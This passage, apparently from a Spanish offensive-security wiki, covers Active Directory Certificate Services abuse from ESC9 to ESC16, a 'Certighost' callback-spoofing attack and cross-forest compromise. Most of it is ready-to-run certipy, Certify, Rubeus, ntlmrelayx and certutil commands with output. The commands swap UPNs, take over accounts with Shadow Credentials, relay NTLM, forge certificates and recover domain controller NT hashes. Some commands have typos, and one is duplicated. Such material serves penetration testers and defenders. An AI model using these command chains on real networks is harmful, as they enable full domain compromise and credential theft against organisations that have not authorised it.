- Se dispone de permisos `GenericWrite` sobre cualquier cuenta para comprometer otra.

### Escenario de abuso

Supongamos que `John@corp.local` tiene permisos `GenericWrite` sobre `Jane@corp.local`, con el objetivo de comprometer `Administrator@corp.local`. La plantilla de certificado `ESC9`, en la que `Jane@corp.local` tiene permisos de enrollment, está configurada con el flag `CT_FLAG_NO_SECURITY_EXTENSION` en su configuración `msPKI-Enrollment-Flag`.

Inicialmente, se obtiene el hash de `Jane` mediante Shadow Credentials, gracias al `GenericWrite` de `John`:
```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```
Posteriormente, el `userPrincipalName` de `Jane` se modifica a `Administrator`, omitiendo deliberadamente la parte del dominio `@corp.local`:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Esta modificación no infringe las restricciones, dado que `Administrator@corp.local` sigue siendo distinto del `userPrincipalName` de `Administrator`.

A continuación, se solicita la plantilla de certificado `ESC9`, marcada como vulnerable, como `Jane`:
```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```
Se observa que el `userPrincipalName` del certificado refleja `Administrator`, sin ningún «object SID».

A continuación, el `userPrincipalName` de `Jane` se revierte al original, `Jane@corp.local`:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Intentar la autenticación con el certificado emitido ahora devuelve el hash NT de `Administrator@corp.local`. El comando debe incluir `-domain <domain>` debido a que el certificado no especifica ningún dominio:
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
## Mapeos de certificados débiles - ESC10

### Explicación

ESC10 hace referencia a dos valores de claves del registro en el controlador de dominio:

- El valor predeterminado de `CertificateMappingMethods` en `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` es `0x18` (`0x8 | 0x10`), anteriormente establecido en `0x1F`.
- La configuración predeterminada de `StrongCertificateBindingEnforcement` en `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` es `1`, anteriormente `0`.<sup>[[7]](#references)</sup>

**Caso 1**

Cuando `StrongCertificateBindingEnforcement` está configurado como `0`.

**Caso 2**

Si `CertificateMappingMethods` incluye el bit `UPN` (`0x4`).

### Caso de abuso 1

Con `StrongCertificateBindingEnforcement` configurado como `0`, una cuenta A con permisos `GenericWrite` puede explotarse para comprometer cualquier cuenta B.

Por ejemplo, si se tienen permisos `GenericWrite` sobre `Jane@corp.local`, un atacante intenta comprometer `Administrator@corp.local`. El procedimiento es similar al de ESC9, lo que permite utilizar cualquier plantilla de certificado.

Inicialmente, se obtiene el hash de `Jane` mediante Shadow Credentials, explotando los permisos `GenericWrite`.
```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```
Posteriormente, el `userPrincipalName` de `Jane` se modifica a `Administrator`, omitiendo deliberadamente la parte `@corp.local` para evitar una violación de restricciones.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
A continuación, se solicita como `Jane` un certificado que permite la autenticación de cliente, utilizando la plantilla predeterminada `User`.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
El `userPrincipalName` de `Jane` se revierte entonces a su valor original, `Jane@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Autenticarse con el certificado obtenido devolverá el hash NT de `Administrator@corp.local`, por lo que es necesario especificar el dominio en el comando debido a la ausencia de los detalles del dominio en el certificado.
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
### Caso de abuso 2

Con `CertificateMappingMethods` conteniendo el indicador de bit `UPN` (`0x4`), una cuenta A con permisos `GenericWrite` puede comprometer cualquier cuenta B que carezca de una propiedad `userPrincipalName`, incluidas las cuentas de máquina y la cuenta de administrador de dominio integrada `Administrator`.

Aquí, el objetivo es comprometer `DC$@corp.local`, empezando por obtener el hash de `Jane` mediante Shadow Credentials y aprovechando `GenericWrite`.
```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```
El `userPrincipalName` de `Jane` se establece entonces en `DC$@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```
Se solicita un certificado para la autenticación de clientes como `Jane` utilizando la plantilla predeterminada `User`.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
El `userPrincipalName` de `Jane` se revierte a su valor original después de este proceso.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```
Para autenticarse mediante Schannel, se utiliza la opción `-ldap-shell` de Certipy, lo que indica que la autenticación se realizó correctamente como `u:CORP\DC$`.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
A través del shell LDAP, comandos como `set_rbcd` permiten ataques de Resource-Based Constrained Delegation (RBCD), lo que puede comprometer el controlador de dominio.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Esta vulnerabilidad también se extiende a cualquier cuenta de usuario que carezca de un `userPrincipalName` o cuyo valor no coincida con `sAMAccountName`, siendo `Administrator@corp.local` un objetivo prioritario debido a sus privilegios LDAP elevados y a la ausencia de un `userPrincipalName` de forma predeterminada.

## Relaying NTLM to ICPR - ESC11

### Explicación

Si el CA Server no está configurado con `IF_ENFORCEENCRYPTICERTREQUEST`, es posible realizar ataques de NTLM relay sin firma mediante el servicio RPC. [Referencia aquí](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).<sup>[[10]](#references)</sup>

Puedes usar `certipy` para enumerar si `Enforce Encryption for Requests` está deshabilitado; certipy mostrará las vulnerabilidades `ESC11`.
```bash
$ certipy find -u <user>@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
0
CA Name                             : DC01-CA
DNS Name                            : DC01.domain.local
Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
....
Enforce Encryption for Requests     : Disabled
....
[!] Vulnerabilities
ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```
### Escenario de abuso

Es necesario configurar un servidor de relay:
```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
Nota: Para los controladores de dominio, debemos especificar `-template` en DomainController.

O usando [el fork de impacket de sploutchy](https://github.com/sploutchy/impacket):
```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```
## Acceso shell a ADCS CA con YubiHSM - ESC12

### Explicación

Los administradores pueden configurar la Certificate Authority para almacenarla en un dispositivo externo como el "Yubico YubiHSM2".

Si el dispositivo USB está conectado al servidor de la CA mediante un puerto USB, o a un USB device server en caso de que el servidor de la CA sea una máquina virtual, se requiere una clave de autenticación (a veces denominada "contraseña") para que el Key Storage Provider genere y utilice claves en el YubiHSM.

Esta clave/contraseña se almacena en el registro, en `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword`, en texto plano.

Referencia [aquí](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm).<sup>[[11]](#references)</sup>

### Escenario de abuso

Si la clave privada de la CA está almacenada en un dispositivo USB físico cuando obtienes acceso shell, es posible recuperar la clave.

Primero, debes obtener el certificado de la CA (es público) y luego:
```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```
Finalmente, utiliza el comando `certutil -sign` para falsificar un nuevo certificado arbitrario utilizando el certificado de la CA y su clave privada.

## OID Group Link Abuse - ESC13

### Explicación

El atributo `msPKI-Certificate-Policy` permite añadir la política de emisión a la plantilla de certificado. Los objetos `msPKI-Enterprise-Oid`, responsables de emitir políticas, pueden descubrirse en el Configuration Naming Context (CN=OID,CN=Public Key Services,CN=Services) del contenedor de OID de la PKI. Una política puede vincularse a un grupo de AD mediante el atributo `msDS-OIDToGroupLink` de este objeto, lo que permite que un sistema autorice a un usuario que presente el certificado como si fuera miembro del grupo. [Referencia aquí](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).<sup>[[12]](#references)</sup>

En otras palabras, cuando un usuario tiene permisos para inscribir un certificado y el certificado está vinculado a un grupo OID, el usuario puede heredar los privilegios de este grupo.

Utiliza [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1) para encontrar OIDToGroupLink:
```bash
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```
### Escenario de abuso

Busca un permiso de usuario que se pueda utilizar con `certipy find` o `Certify.exe find /showAllPermissions`.

Si `John` tiene permisos para inscribirse en `VulnerableTemplate`, el usuario puede heredar los privilegios del grupo `VulnerableGroup`.

Solo necesita especificar la plantilla; obtendrá un certificado con derechos `OIDToGroupLink`.
```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```
## Configuración vulnerable de renovación de certificados - ESC14

### Explicación

La descripción en https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc14-weak-explicit-certificate-mapping es excepcionalmente exhaustiva. A continuación se incluye una cita del texto original.<sup>[[14]](#references)</sup>

ESC14 aborda las vulnerabilidades derivadas de la "asignación explícita débil de certificados", principalmente mediante el uso indebido o la configuración insegura del atributo `altSecurityIdentities` en cuentas de usuario o equipo de Active Directory. Este atributo multivalor permite a los administradores asociar manualmente certificados X.509 con una cuenta de AD con fines de autenticación. Cuando se rellenan, estas asignaciones explícitas pueden sobrescribir la lógica de asignación de certificados predeterminada, que normalmente se basa en los UPN o nombres DNS presentes en el SAN del certificado, o en el SID integrado en la extensión de seguridad `szOID_NTDS_CA_SECURITY_EXT`.

Una asignación "débil" ocurre cuando el valor de cadena utilizado dentro del atributo `altSecurityIdentities` para identificar un certificado es demasiado amplio, fácil de adivinar, depende de campos de certificado no únicos o utiliza componentes del certificado que pueden falsificarse fácilmente. Si un atacante puede obtener o crear un certificado cuyos atributos coincidan con una asignación explícita débilmente definida para una cuenta privilegiada, puede utilizar dicho certificado para autenticarse como esa cuenta e suplantarla.

Entre los ejemplos de cadenas de asignación potencialmente débiles de `altSecurityIdentities` se incluyen:

- Asignación únicamente mediante un Subject Common Name (CN) común: por ejemplo, `X509:<S>CN=SomeUser`. Un atacante podría obtener un certificado con este CN desde una fuente menos segura.
- Uso de Issuer Distinguished Names (DN) o Subject DNs demasiado genéricos sin cualificación adicional, como un número de serie específico o un identificador de clave del sujeto: por ejemplo, `X509:<I>CN=SomeInternalCA<S>CN=GenericUser`.
- Uso de otros patrones predecibles o identificadores no criptográficos que un atacante podría satisfacer en un certificado que pueda obtener legítimamente o falsificar (si ha comprometido una CA o encontrado una plantilla vulnerable como en ESC1).

El atributo `altSecurityIdentities` admite varios formatos de asignación, como:

- `X509:<I>IssuerDN<S>SubjectDN` (asigna mediante el Issuer y Subject DN completos)
- `X509:<SKI>SubjectKeyIdentifier` (asigna mediante el valor de extensión Subject Key Identifier del certificado)
- `X509:<SR>SerialNumberBackedByIssuerDN` (asigna mediante el número de serie, cualificado implícitamente por el Issuer DN); este no es un formato estándar, normalmente es `<I>IssuerDN<SR>SerialNumber`.
- `X509:<RFC822>EmailAddress` (asigna mediante un nombre RFC822, normalmente una dirección de correo electrónico, del SAN)
- `X509:<SHA1-PUKEY>Thumbprint-of-Raw-PublicKey` (asigna mediante un hash SHA1 de la clave pública sin procesar del certificado; generalmente es seguro)

La seguridad de estas asignaciones depende en gran medida de la especificidad, unicidad y solidez criptográfica de los identificadores de certificado elegidos y utilizados en la cadena de asignación. Incluso con modos de vinculación segura de certificados habilitados en los Domain Controllers (que afectan principalmente a las asignaciones implícitas basadas en UPN/DNS del SAN y en la extensión SID), una entrada de `altSecurityIdentities` configurada incorrectamente aún puede proporcionar una vía directa para la suplantación si la propia lógica de asignación es defectuosa o demasiado permisiva.

### Escenario de abuso

ESC14 se dirige a las **asignaciones explícitas de certificados** en Active Directory (AD), específicamente al atributo `altSecurityIdentities`. Si este atributo está configurado (por diseño o debido a una configuración incorrecta), los atacantes pueden suplantar cuentas presentando certificados que coincidan con la asignación.

#### Escenario A: El atacante puede escribir en `altSecurityIdentities`

**Condición previa**: El atacante tiene permisos de escritura sobre el atributo `altSecurityIdentities` de la cuenta objetivo, o tiene permisos para concedérselos mediante uno de los siguientes permisos sobre el objeto de AD objetivo:
- Propiedad de escritura `altSecurityIdentities`
- Propiedad de escritura `Public-Information`
- Propiedad de escritura (todas)
- `WriteDACL`
- `WriteOwner`*
- `GenericWrite`
- `GenericAll`
- Propietario*.
#### Escenario B: El objetivo tiene una asignación débil mediante X509RFC822 (correo electrónico)

- **Condición previa**: El objetivo tiene una asignación X509RFC822 débil en `altSecurityIdentities`. Un atacante puede establecer el atributo `mail` de la víctima para que coincida con el nombre X509RFC822 del objetivo, inscribir un certificado como la víctima y utilizarlo para autenticarse como el objetivo.
#### Escenario C: El objetivo tiene una asignación X509IssuerSubject

- **Condición previa**: El objetivo tiene una asignación explícita X509IssuerSubject débil en `altSecurityIdentities`.El atacante puede establecer el atributo `cn` o `dNSHostName` de una entidad principal víctima para que coincida con el sujeto de la asignación X509IssuerSubject del objetivo. A continuación, el atacante puede inscribir un certificado como la víctima y utilizarlo para autenticarse como el objetivo.
#### Escenario D: El objetivo tiene una asignación X509SubjectOnly

- **Condición previa**: El objetivo tiene una asignación explícita X509SubjectOnly débil en `altSecurityIdentities`. El atacante puede establecer el atributo `cn` o `dNSHostName` de una entidad principal víctima para que coincida con el sujeto de la asignación X509SubjectOnly del objetivo. A continuación, el atacante puede inscribir un certificado como la víctima y utilizarlo para autenticarse como el objetivo.
### operaciones concretas
#### Escenario A

Solicitar un certificado de la plantilla de certificado `Machine`
```bash
.\Certify.exe request /ca:<ca> /template:Machine /machine
```
Guardar y convertir el certificado
```bash
certutil -MergePFX .\esc13.pem .\esc13.pfx
```
Autenticarse (usando el certificado)
```bash
.\Rubeus.exe asktgt /user:<user> /certificate:C:\esc13.pfx /nowrap
```
Limpieza (opcional)
```bash
Remove-AltSecIDMapping -DistinguishedName "CN=TargetUserA,CN=Users,DC=external,DC=local" -MappingString "X509:<I>DC=local,DC=external,CN=external-EXTCA01-CA<SR>250000000000a5e838c6db04f959250000006c"
```
Para obtener métodos de ataque más específicos en varios escenarios de ataque, consulta lo siguiente: [adcs-esc14-abuse-technique](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#aca0).<sup>[[13]](#references)</sup>

## EKUwu Application Policies(CVE-2024-49019) - ESC15

### Explicación

La descripción en https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc es excepcionalmente exhaustiva. A continuación se incluye una cita del texto original.<sup>[[15]](#references)</sup>

Mediante el uso de plantillas de certificados de versión 1 predeterminadas integradas, un atacante puede crear un CSR que incluya application policies que tengan prioridad sobre los atributos de Extended Key Usage configurados y especificados en la plantilla. El único requisito son permisos de enrollment, y puede utilizarse para generar certificados de autenticación de cliente, de agente de solicitud de certificados y de codesigning mediante la plantilla **_WebServer_**

### Abuso

La [documentación de escalada de privilegios de Certipy](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu) contiene ejemplos de uso más detallados.<sup>[[14]](#references)</sup>


El comando `find` de Certipy puede ayudar a identificar plantillas V1 potencialmente susceptibles a ESC15 si la CA no está parcheada.
```bash
certipy find -username cccc@aaa.htb -password aaaaaa -dc-ip 10.0.0.100
```
#### Escenario A: Impersonación directa mediante Schannel

**Paso 1: Solicitar un certificado, inyectando la directiva de aplicación "Client Authentication" y el UPN objetivo.** El atacante `attacker@corp.local` apunta a `administrator@corp.local` utilizando la plantilla "WebServer" V1 (que permite al solicitante proporcionar el sujeto).
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' \
-application-policies 'Client Authentication'
```
- `-template 'WebServer'`: La plantilla V1 vulnerable con "Enrollee supplies subject".
- `-application-policies 'Client Authentication'`: Inyecta el OID `1.3.6.1.5.5.7.3.2` en la extensión Application Policies del CSR.
- `-upn 'administrator@corp.local'`: Establece el UPN en el SAN para la suplantación.

**Paso 2: Autenticarse mediante Schannel (LDAPS) usando el certificado obtenido.**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100' -ldap-shell
```
#### Escenario B: Impersonation de PKINIT/Kerberos mediante el abuso de Enrollment Agent

**Paso 1: Solicitar un certificado desde una plantilla V1 (con "Enrollee supplies subject"), inyectando la Application Policy "Certificate Request Agent".** Este certificado es para que el atacante (`attacker@corp.local`) se convierta en un enrollment agent. Aquí no se especifica ningún UPN para la identidad propia del atacante, ya que el objetivo es obtener la capacidad de agent.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-application-policies 'Certificate Request Agent'
```
- `-application-policies 'Certificate Request Agent'`: Injecta el OID `1.3.6.1.4.1.311.20.2.1`.

**Paso 2: Usa el certificado del "agent" para solicitar un certificado en nombre de un usuario privilegiado objetivo.** Este es un paso similar a ESC3, que utiliza el certificado del Paso 1 como certificado del agent.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'User' \
-pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'
```
**Paso 3: Autenticarse como el usuario privilegiado utilizando el certificado "on-behalf-of".**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```
## Extensión de seguridad deshabilitada en la CA (globalmente)-ESC16

### Explicación

**ESC16 (Elevation of Privilege via Missing szOID_NTDS_CA_SECURITY_EXT Extension)** se refiere al escenario en el que, si la configuración de AD CS no impone la inclusión de la extensión **szOID_NTDS_CA_SECURITY_EXT** en todos los certificados, un atacante puede aprovecharlo para:

1. Solicitar un certificado **sin vinculación al SID**.

2. Usar este certificado **para autenticarse como cualquier cuenta**, por ejemplo, suplantando una cuenta con privilegios elevados (p. ej., un Domain Administrator).

También puedes consultar este artículo para obtener más información sobre el principio detallado:https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6<sup>[[16]](#references)</sup>

### Abuso

Lo siguiente hace referencia a [este enlace](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally). Haz clic para consultar métodos de uso más detallados.<sup>[[14]](#references)</sup>

Para identificar si el entorno de Active Directory Certificate Services (AD CS) es vulnerable a **ESC16**
```bash
certipy find -u 'attacker@corp.local' -p '' -dc-ip 10.0.0.100 -stdout -vulnerable
```
**Paso 1: Leer el UPN inicial de la cuenta víctima (opcional, para restaurarlo).**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -user 'victim' \
read
```
**Paso 2: Actualiza el UPN de la cuenta víctima al `sAMAccountName` del administrador objetivo.**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'administrator' \
-user 'victim' update
```
**Paso 3: (Si es necesario) Obtén las credenciales de la cuenta de la "víctima" (por ejemplo, mediante Shadow Credentials).**
```shell
certipy shadow \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -account 'victim' \
auto
```
**Paso 4: Solicita un certificado como el usuario "víctima" desde _cualquier plantilla adecuada de autenticación de cliente_ (por ejemplo, "User") en la CA vulnerable a ESC16.** Debido a que la CA es vulnerable a ESC16, omitirá automáticamente la extensión de seguridad SID del certificado emitido, independientemente de la configuración específica de la plantilla para esta extensión. Establece la variable de entorno de la caché de credenciales de Kerberos (comando de shell):
```bash
export KRB5CCNAME=victim.ccache
```
A continuación, solicita el certificado:
```bash
certipy req \
-k -dc-ip '10.0.0.100' \
-target 'CA.CORP.LOCAL' -ca 'CORP-CA' \
-template 'User'
```
**Paso 5: Revierte el UPN de la cuenta "víctima".**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'victim@corp.local' \
-user 'victim' update
```
**Paso 6: Autentícate como el administrador objetivo.**
```bash
certipy auth \
-dc-ip '10.0.0.100' -pfx 'administrator.pfx' \
-username 'administrator' -domain 'corp.local'
```
## Sustitución de identidad en callback de chase de Rogue LDAP/LSA (Certighost / CVE-2026-54121)

### Explicación

**Certighost** abusa de una **ruta de enrollment chase / callback de AD CS** en la que la CA confía en los atributos de solicitud proporcionados por el solicitante para resolver la identidad que debe incluirse en el certificado emitido. En el PoC público, la solicitud manipulada incluye:<sup>[[1]](#references)[[2]](#references)</sup>

- **`cdc`**: host/IP controlado por el atacante al que se conectará la CA
- **`rmd`**: el **nombre DNS del Domain Controller objetivo** que se quiere suplantar

Si la CA sigue ese chase, se conectará al atacante mediante **SMB/LSA (`445`)** y **LDAP (`389`)**. El atacante utiliza una **cuenta de máquina real** (normalmente creada mediante el **`ms-DS-MachineAccountQuota`** predeterminado), de modo que la sesión del callback se autentica como una entidad válida del dominio, pero los servicios rogue devuelven los atributos de identidad del **DC objetivo**:

- `sAMAccountName`
- `objectSid` / SID
- `dNSHostName`

Si la CA **no vincula criptográficamente la identidad devuelta con la entidad principal autenticada del callback**, puede emitir un certificado para el **Domain Controller**, aunque la sesión se haya autenticado con la cuenta de máquina controlada por el atacante. Esto hace que el fallo sea conceptualmente diferente de **Certifried**: en lugar de reescribir atributos de AD como `dNSHostName`, el atacante **sustituye los datos de identidad durante la resolución del callback de la CA**.<sup>[[2]](#references)</sup>

**Requisitos previos útiles:**

- **Credenciales de dominio** con pocos privilegios
- Capacidad para **crear o reutilizar una cuenta de equipo**
- Conectividad de red desde la **CA** hacia los **puertos `389` y `445`** controlados por el atacante
- Ruta de solicitud de la CA vulnerable o sin parchear (la actualización de Microsoft del **14 de julio de 2026** añadió la **validación del DC para `cdc`** y una **comparación del SID resuelto**)

El **`.pfx`** resultante puede utilizarse entonces para **PKINIT**, generando un **`.ccache`** y, en el flujo del PoC publicado, el **hash NT del DC objetivo**, lo que normalmente es suficiente para lograr un **compromiso total del dominio**.

### Abuso

El PoC público automatiza toda la cadena:<sup>[[1]](#references)</sup>

1. Crear o reutilizar una **cuenta de máquina** controlada por el atacante.
2. Iniciar **listeners rogue de LDAP y SMB/LSA** en `389` y `445`.
3. Enviar una solicitud de certificado que contenga los atributos **`cdc`** controlados por el atacante y **`rmd`** del objetivo.
4. Permitir que la CA se autentique en los listeners rogue como la cuenta de máquina controlada, pero responder a las búsquedas de identidad con los atributos del **DC objetivo**.
5. Recibir un **certificado de DC** firmado por la CA y utilizarlo para **PKINIT**.
```bash
sudo python3 certighost.py -d playground.local -u lowpriv -p 'Password1234' --dc-ip 192.168.1.10
```
Indicadores útiles en runtime del PoC:

- `--listener <ip>`: selecciona explícitamente la IP de callback anunciada en `cdc`
- `--computer-name <NAME$>`: reutiliza una cuenta de máquina existente en lugar de crear una nueva

**Notas operativas:**

- El PoC necesita **root** porque enlaza con los **puertos privilegiados** `389` y `445`.
- La explotación exitosa escribe localmente un **DC `.pfx`** y un **Kerberos `.ccache`**.
- Debido a que el certificado se asigna a una **cuenta de Domain Controller**, las acciones posteriores pueden incluir **autenticación Kerberos basada en certificados**, **DCSync** y la reutilización del **machine NT hash** recuperado.<sup>[[2]](#references)</sup>

## Compromiso de forests con certificados explicado en voz pasiva

### Ruptura de trusts entre forests mediante CAs comprometidas

La configuración para el **cross-forest enrollment** se realiza de forma relativamente sencilla. El certificado de la **root CA** del resource forest es **publicado en los account forests** por los administradores, y los certificados de la **enterprise CA** del resource forest son **añadidos a los contenedores `NTAuthCertificates` y AIA de cada account forest**. Para aclararlo, esta disposición otorga a la **CA del resource forest un control completo** sobre todos los demás forests para los que gestiona la PKI. Si esta CA fuese **comprometida por atacantes**, ellos podrían **forjar certificados para todos los usuarios de los resource y account forests**, rompiendo así el límite de seguridad del forest.<sup>[[6]](#references)</sup>

### Privilegios de enrollment otorgados a foreign principals

En entornos multi-forest, se requiere precaución con respecto a las Enterprise CAs que **publican certificate templates** que permiten a **Authenticated Users o foreign principals** (usuarios/grupos externos al forest al que pertenece la Enterprise CA) disponer de **derechos de enrollment y edición**.\
Al autenticarse a través de un trust, AD añade el **Authenticated Users SID** al token del usuario. Por lo tanto, si un dominio posee una Enterprise CA con un template que **permite derechos de enrollment a Authenticated Users**, un usuario de un forest diferente podría potencialmente **realizar el enrollment en dicho template**. Del mismo modo, si mediante un template se **otorgan explícitamente derechos de enrollment a un foreign principal**, se crea así una **relación de control de acceso cross-forest**, que permite a un principal de un forest **realizar el enrollment en un template de otro forest**.

Ambos escenarios provocan un **aumento de la attack surface** de un forest a otro. La configuración del certificate template podría ser explotada por un atacante para obtener privilegios adicionales en un dominio foreign.<sup>[[6]](#references)</sup>


## References

- [1] [aniqfakhrul/CVE-2026-54121 repositorio del PoC](https://github.com/aniqfakhrul/CVE-2026-54121)
- [2] [H0j3n - análisis técnico de Certighost](https://gist.github.com/H0j3n/a5ef2609b5f2944ac2390a191a534c26)
- [3] [Certify 2.0 – blog de SpecterOps](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [4] [GhostPack/Certify](https://github.com/GhostPack/Certify)
- [5] [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
- [6] [SpecterOps – Certified Pre-Owned: abuso de Active Directory Certificate Services](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [7] [Oliver Lyak – Certipy 4.0: ESC9, ESC10, interfaz gráfica de BloodHound, nuevos métodos de autenticación y solicitud, y más](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
- [8] [SpecterOps – Shadow Credentials: abuso de la asignación de cuentas mediante Key Trust para tomar el control de cuentas](https://specterops.io/blog/2021/06/17/shadow-credentials-abusing-key-trust-account-mapping-for-account-takeover/)
- [9] [CQure Academy – El relato del (mal) uso de Enhanced Key](https://cqureacademy.com/blog/enhanced-key-usage)
- [10] [Compass Security – Relaying a AD Certificate Services mediante RPC](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/)
- [11] [hajo – ESC12: acceso shell a la CA de ADCS con YubiHSM](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm)
- [12] [SpecterOps – técnica de abuso ADCS ESC13](https://specterops.io/blog/2024/02/14/adcs-esc13-abuse-technique/)
- [13] [SpecterOps – técnica de abuso ADCS ESC14](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/)
- [14] [Certipy Wiki – escalada de privilegios (ESC1-ESC17)](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation)
- [15] [TrustedSec – EKUwu: no es otro AD CS ESC más](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc)
- [16] [Furious5 – AD CS ESC16: configuración incorrecta y explotación](https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6)
{{#include ../../../banners/hacktricks-training.md}}
